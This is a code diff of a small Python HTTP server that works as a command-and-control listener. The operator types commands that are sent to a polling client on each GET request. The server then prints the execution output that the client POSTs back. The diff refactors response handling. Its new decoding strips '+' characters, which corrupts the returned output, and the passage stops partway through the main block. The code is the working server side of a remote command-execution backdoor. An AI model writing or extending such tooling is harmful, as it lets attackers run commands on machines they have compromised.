@@ -1,32 +1,32 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
-from urllib.parse import unquote
+import urllib.parse
 
 HOST_NAME = '127.0.0.1'
 PORT_NUMBER = 80
 
 class MyHandler(BaseHTTPRequestHandler):
-
-    def do_GET(self):
+    def _set_response(self):
         self.send_response(200)
         self.send_header("Content-type", "text/plain")
         self.end_headers()
 
+    def do_GET(self):
+        self._set_response()
         user_input = input("Enter a command to send to the client: ")
         self.wfile.write(user_input.encode())
 
     def do_POST(self):
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length)
-        output_start = post_data.find(b'output=') + len(b'output=')
-        output = post_data[output_start:]
-        decoded_output = unquote(output.decode('utf-8'))
-        response_data = f"Output:\n{decoded_output}"
 
-        self.send_response(200)
-        self.send_header("Content-type", "text/plain")
-        self.end_headers()
-        self.wfile.write(response_data.encode('utf-8'))  # Encode as bytes before writing
-        print(response_data)  # Print the response to the console
+        # Decode the URL-encoded data and remove '+' symbols
+        decoded_data = urllib.parse.unquote(post_data.decode('utf-8')).replace('+', '')
+
+        response_data = f"Output:\n{decoded_data}"
+
+        self._set_response()
+        self.wfile.write(response_data.encode('utf-8'))
+        print(response_data)
 
 if __name__ == '__main__':
     server_class = HTTPServer
